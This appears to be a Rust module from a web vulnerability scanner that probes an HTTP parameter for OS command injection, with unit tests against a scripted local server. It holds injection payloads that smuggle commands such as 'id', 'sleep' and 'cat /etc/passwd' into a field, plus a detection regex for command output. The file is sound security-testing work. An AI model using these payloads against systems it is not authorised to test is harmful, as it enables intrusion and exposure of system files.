//! cmdi — OS command injection (time-based + error-marker detection).
//!
//! Port of `checks/cmdi.py`.

use crate::opts::Opts;
use crate::registry::CheckFuture;
use pentest_core::{Finding, HttpClient, HttpRequest, Severity};
use std::sync::LazyLock;

pub const NAME: &str = "cmdi";

// Match command OUTPUT (proof of execution), never the command we injected --
// otherwise an app that echoes the payload back produces a false positive.
static ERROR_MARKERS: LazyLock<regex::Regex> = LazyLock::new(|| {
    regex::Regex::new(
        r#"(?i)/bin/(?:sh|bash):|sh: \d+:|command not found|is not recognized as an internal|CreateProcess|root:.*:0:0:|uid=\d+\(|gid=\d+\("#,
    )
    .unwrap()
});

async fn send(client: &HttpClient, method: &str, param: &str, val: &str) -> Option<pentest_core::HttpResponse> {
    let req = if method == "POST" { HttpRequest::post().form_field(param, val) } else { HttpRequest::get().param(param, val) };
    client.request(req).await.ok()
}

pub fn run<'a>(client: &'a HttpClient, opts: &'a Opts) -> CheckFuture<'a> {
    Box::pin(run_impl(client, opts))
}

async fn run_impl(client: &HttpClient, opts: &Opts) -> Vec<Finding> {
    let mut out = Vec::new();
    let Some(param) = &opts.param else {
        return out;
    };
    let method = opts.method.to_uppercase();
    let base = &opts.base_value;
    let n = opts.sleep;

    let Some(baseline) = send(client, &method, param, base).await else {
        return out;
    };

    for p in [format!("{base}; id"), format!("{base}| id"), format!("{base}`id`"), format!("{base}; cat /etc/passwd")] {
        let Some(r) = send(client, &method, param, &p).await else { continue };
        if let Some(m) = ERROR_MARKERS.find(&r.body) {
            if p.find(m.as_str()).is_none() && ERROR_MARKERS.find(&baseline.body).is_none() {
                let mut f = Finding::new(NAME, Severity::Critical, "OS command injection (in-band)", format!("payload {p:?} produced command output"))
                    .with_evidence(m.as_str());
                f.payload = p.clone();
                f.proof = format!("command output leaked: {}", m.as_str());
                out.push(f);
                return out;
            }
        }
    }

    let time_payloads = [
        format!("{base}; sleep {n}"),
        format!("{base}| sleep {n}"),
        format!("{base}&& sleep {n}"),
        format!("{base}`sleep {n}`"),
        format!("{base}$(sleep {n})"),
        format!("{base}& ping -n {n} 127.0.0.1"),
    ];
    for p in &time_payloads {
        let Some(r) = send(client, &method, param, p).await else { continue };
        let elapsed = r.elapsed.as_secs_f64();
        let baseline_elapsed = baseline.elapsed.as_secs_f64();
        if elapsed >= n as f64 * 0.8 && elapsed > baseline_elapsed + n as f64 * 0.6 {
            let mut fnd = Finding::new(
                NAME,
                Severity::Critical,
                "Blind OS command injection (time-based)",
                format!("payload delayed response to {elapsed:.1}s (baseline {baseline_elapsed:.1}s)"),
            )
            .with_evidence(p.clone());
            fnd.payload = p.clone();
            out.push(fnd);
            break;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::test_support::{scripted_server, ScriptedResponse};
    use pentest_core::HttpClientConfig;

    fn fast_client(base_url: String) -> HttpClient {
        let config = HttpClientConfig { delay: std::time::Duration::from_millis(0), ..HttpClientConfig::default() };
        HttpClient::new(base_url, config)
    }

    #[tokio::test]
    async fn detects_in_band_command_output() {
        let base = scripted_server(|req, _| {
            let v = req.query.get("host").cloned().unwrap_or_default();
            if v.contains("id") {
                ScriptedResponse::ok("uid=0(root) gid=0(root) groups=0(root)")
            } else {
                ScriptedResponse::ok("ping: unknown host")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts { param: Some("host".to_string()), ..Opts::default() };

        let findings = run_impl(&client, &opts).await;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].title, "OS command injection (in-band)");
        assert!(!findings[0].proof.is_empty());
    }

    #[tokio::test]
    async fn no_finding_when_response_merely_echoes_the_payload() {
        let base = scripted_server(|req, _| {
            let v = req.query.get("host").cloned().unwrap_or_default();
            ScriptedResponse::ok(format!("you searched for: {v}"))
        })
        .await;
        let client = fast_client(base);
        let opts = Opts { param: Some("host".to_string()), sleep: 1, ..Opts::default() };

        let findings = run_impl(&client, &opts).await;

        assert!(findings.is_empty(), "reflecting the raw payload text back must not itself count as command output");
    }

    #[tokio::test]
    async fn detects_time_based_blind_injection() {
        let base = scripted_server(|req, _| {
            let v = req.query.get("host").cloned().unwrap_or_default();
            if v.contains("sleep") || v.contains("ping") {
                ScriptedResponse::delayed("ok", 850)
            } else {
                ScriptedResponse::ok("ok")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts { param: Some("host".to_string()), sleep: 1, ..Opts::default() };

        let findings = run_impl(&client, &opts).await;

        assert!(findings.iter().any(|f| f.title == "Blind OS command injection (time-based)"));
    }

    #[tokio::test]
    async fn returns_empty_without_a_param() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("ok")).await;
        let client = fast_client(base);
        let findings = run_impl(&client, &Opts::default()).await;
        assert!(findings.is_empty());
    }
}
